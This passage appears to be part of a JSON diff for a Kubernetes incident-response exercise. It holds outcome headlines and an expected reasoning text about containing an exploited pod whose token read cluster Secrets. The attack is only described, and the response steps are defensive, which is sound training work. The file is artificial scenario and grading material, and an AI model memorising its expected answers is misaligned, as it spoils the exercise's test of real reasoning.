+        "body": "Deleting or isolating the pod is not enough while the ReplicaSet starts a replacement from the same flawed image with the same token. Removing the RoleBinding cuts every copy of the token off from the Secrets at once."
+      },
+      "evidenceGone": {
+        "headline": "The evidence went with the pod",
+        "body": "A deleted pod takes its logs and filesystem with it. Save the spec, logs, Falco events and audit entries first, then quarantine the pod with a label and a deny-all NetworkPolicy so it stays for analysis."
+      },
+      "contained": {
+        "headline": "Good: contained, kept and replaced",
+        "body": "You read the Falco output fields to the pod and process, checked what the token could do and what the audit log says it did, saved evidence before touching anything, cut the token's rights and isolated the pod, then replaced it hardened and rotated what was read."
+      },
+      "gaps": {
+        "headline": "Contained, with gaps",
+        "body": "The criteria show what was left: the audit check, an exec that changed the evidence, a muted rule, the hardened rollout or the rotation of the Secret already read."
+      },
+      "time_up": {
+        "headline": "Time up",
+        "body": "No record was written before the run's hard limit."
+      }
+    },
+    "modelReasoning": "The 13:52 alert is a shell spawned by java fetching a script from outside: the catalog flaw exploited. The 13:53 alert is the container calling the API server for Secrets with its mounted token, and can-i shows that token can get and list every Secret in shop; the audit log shows it read db-password already. Save and hash the pod spec, logs, Falco events and audit entries before changing anything, and do not exec in. Cut the token off by deleting RoleBinding catalog-reader, and quarantine the pod with a label and a deny-all NetworkPolicy so it stays for analysis. Deleting the pod destroys evidence and the ReplicaSet brings back the same image with the same token. Then roll out the fixed image with no token, non-root and a read-only root filesystem, and rotate the Secrets that were or could have been read. Muting the rule only hides the next attempt."
+  }
+}
